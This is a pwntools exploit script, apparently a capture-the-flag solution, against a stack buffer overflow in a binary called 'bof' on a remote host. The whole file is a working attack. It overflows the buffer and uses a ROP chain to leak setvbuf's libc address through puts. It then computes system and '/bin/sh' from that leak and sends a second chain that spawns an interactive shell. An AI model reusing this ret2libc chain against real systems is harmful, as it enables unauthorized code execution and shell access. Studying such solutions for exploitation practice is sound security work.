from pwn import *
context.log_level = 'debug'
context.arch = "amd64"

e = context.binary = ELF('bof')
r= e.process()
r = remote('35.198.129.115',31203)
# lib = e.libc
lib= ELF('libc6_2.29-0ubuntu2_amd64.so')

main=0x4007F7
pop_rdi_ret=0x00000000004008c3
ret=pop_rdi_ret+1
setvbuf_got = 0x601048
puts_plt = 0x4005f0

payload = b"a"*0x130+b"b"*8
payload+= flat(pop_rdi_ret, setvbuf_got, puts_plt, main)
pause()
r.sendlineafter(b"flag: \n",payload)
# r.recvline()

setvbuf_libc = u64(r.recv(6).ljust(8,b"\x00")) 
log.info("setvbuf_libc: %#x" %setvbuf_libc)
base_libc = setvbuf_libc - lib.sym.setvbuf
system_libc = base_libc + lib.sym.system
binsh_libc = base_libc + next(lib.search(b"/bin/sh"))
log.info("base_libc: %#x" %base_libc)
log.info("system_libc: %#x" %system_libc)
log.info("binsh_libc: %#x" %binsh_libc)

payload = b"a"*0x130+b"b"*8
payload+= flat(ret, pop_rdi_ret, binsh_libc, system_libc, main)
pause()
r.sendlineafter(b"flag: \n",payload)

r.interactive()
